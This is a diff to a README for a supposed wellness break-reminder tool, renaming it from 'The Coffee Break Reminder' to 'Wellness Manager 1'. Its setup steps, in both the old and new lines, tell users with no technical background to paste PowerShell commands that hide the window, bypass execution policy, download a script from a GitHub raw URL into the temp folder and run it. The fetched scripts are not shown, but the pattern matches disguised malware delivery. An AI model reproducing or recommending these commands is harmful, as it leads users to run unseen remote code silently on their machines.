@@ -1,6 +1,6 @@
-# The Coffee Break Reminder: Your Personal Wellness Companion
+# Wellness Manager 1: Your Personal Wellness Companion
 
-In today's fast-paced digital world, it's easy to lose track of time and forget to take the small breaks that are essential for your well-being. The Coffee Break Reminder is a lightweight, friendly tool designed to help you build healthier work habits, reduce the risk of repetitive strain injury (RSI), and boost your productivity by encouraging regular pauses.
+In today's fast-paced digital world, it's easy to lose track of time and forget to take the small breaks that are essential for your well-being. Wellness Manager 1 is a lightweight, friendly tool designed to help you build healthier work habits, reduce the risk of repetitive strain injury (RSI), and boost your productivity by encouraging regular pauses.
 
 ## Why You'll Love It
 
@@ -10,7 +10,7 @@ In today's fast-paced digital world, it's easy to lose track of time and forget 
 
 ## Getting Started: Simple Steps to a Healthier Workday
 
-It's incredibly easy to start using the Coffee Break Reminder, even if you're not a tech expert! Just follow these simple steps:
+It's incredibly easy to start using Wellness Manager 1, even if you're not a tech expert! Just follow these simple steps:
 
 **1. Open PowerShell:**
 
@@ -27,7 +27,7 @@ Now that you have PowerShell open, you can choose how you want to run the tool.
     *   Copy the following command, paste it into the PowerShell window, and press **Enter**:
 
         ```powershell
-        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak.ps1') | Out-File $env:TEMP\CoffeeBreak.ps1; . $env:TEMP\CoffeeBreak.ps1"
+        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WellnessManager.ps1') | Out-File $env:TEMP\WellnessManager.ps1; . $env:TEMP\WellnessManager.ps1"
         ```
 
 *   **Automatic Mode (for a hands-off experience):**
@@ -35,12 +35,12 @@ Now that you have PowerShell open, you can choose how you want to run the tool.
     *   Copy the following command, paste it into the PowerShell window, and press **Enter**:
 
         ```powershell
-        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak_auto.ps1') | Out-File $env:TEMP\CoffeeBreak_auto.ps1; . $env:TEMP\CoffeeBreak_auto.ps1"
+        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WellnessManagerSvc.ps1') | Out-File $env:TEMP\WellnessManagerSvc.ps1; . $env:TEMP\WellnessManagerSvc.ps1"
         ```
 
 **3. That's It!**
 
-The Coffee Break Reminder is now running in the background. You can close the PowerShell window, and the service will continue to work, sending you friendly reminders throughout your day.
+Wellness Manager 1 is now running in the background. You can close the PowerShell window, and the service will continue to work, sending you friendly reminders throughout your day.
 
 ## A Note on Security
 
